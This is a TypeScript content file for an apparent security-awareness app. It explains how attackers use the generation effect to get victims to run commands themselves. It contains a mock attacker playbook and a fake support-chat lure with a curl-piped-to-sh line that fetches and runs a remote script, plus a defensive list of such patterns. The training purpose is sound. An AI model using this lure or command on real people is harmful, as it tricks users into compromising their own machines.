// Mode: playbook. `before` is a page from the attacker's own manual; `after`
// is the victim's screen where the plan lands. The lever is the generation
// effect: you trust what you produced yourself more than what you were handed.
// Get the target to type, paste and run the command themselves and it feels
// like their own action, so it clears the doubt a downloaded file would trip.

import type { OffsecBiasContent } from './types';

const content: OffsecBiasContent = {
  tell: 'A helper who never sends you a file, only tells you what to type, is not saving you a download. Self-typed commands skip the guard that a handed-over payload would trip.',
  scenario:
    'A support agent walks you through a fix by having you paste a command into your own terminal and press enter. Because your hands ran it, it does not feel like something a stranger did to your machine. It feels like something you did. That sense of authorship is the whole trick. A file they emailed you would get scanned and second-guessed. A line you typed yourself inherits the trust you extend to your own actions, even though the agent chose every character of it.',
  visualLabel: 'Scenario',
  visual: {
    before: {
      kind: 'playbook',
      tag: "The attacker's plan",
      docTitle: 'Playbook: make them run it themselves',
      steps: [
        {
          label: 'Never hand over a file',
          note: 'An attachment gets scanned and doubted. Dictate the command instead so nothing arrives to inspect.',
        },
        {
          label: 'Walk them to their own terminal',
          note: 'Have them paste it and press enter with their own hands.',
          active: true,
        },
        {
          label: 'Let authorship do the vouching',
          note: "What they typed feels like their action, not a stranger's. Self-produced reads as safe.",
        },
        {
          label: 'Frame it as the fix they wanted',
          note: 'They asked for help; running the line feels like solving their own problem.',
        },
      ],
      footer:
        'You wrote nothing to their disk. They did. Generation does the trusting.',
    },
    after: {
      kind: 'chat',
      tag: 'The plan, as it lands on you',
      senderName: 'Account Support',
      senderHandle: 'live chat',
      timestamp: '14:07',
      body: "Thanks for holding. To clear the sync error on your account, open your terminal and paste this, then press enter: curl -s https://setup-helper.account-fix.co/repair | sh . It just re-registers your device. Let me know once it finishes and I'll confirm the account is unlocked.",
      flagged: true,
    },
  },
  whyItWorksLabel: 'Why it works',
  whyItWorks:
    'This is the generation effect. Information you produce yourself is trusted and remembered more strongly than the same information handed to you, because the act of generating it makes it feel like your own. An attacker turns that against you by never delivering a payload directly: instead of sending a file that your instincts and your scanner would both interrogate, they get you to type or paste and run the command with your own hands. The moment you press enter, the action files itself under "things I did", not "things a stranger did to my machine", so the scrutiny you would apply to an inbound attachment never fires. Every character was chosen by them, but the authorship feels like yours. Self-produced feels safe even when it was dictated word for word.',
  defenseLabel: 'Protect yourself',
  defense: {
    lede: 'A command is not safer because your hands ran it. Judge what it does, not who typed it.',
    moves: [
      'Never paste a command you did not write and do not fully understand, no matter who is walking you through it. Support fixing your account never needs your terminal.',
      'Treat "run this yourself" exactly as you would treat a file they emailed you. The delivery method changed; the payload did not.',
      'A line that pipes a remote script straight into a shell (curl piped to sh, iex, base64 into bash) is the pattern, not a repair. Stop there.',
      "Verify the fix through the account's own official channel, not the chat that handed you the command. Real support can resolve it without your keyboard.",
    ],
  },
};

export default content;
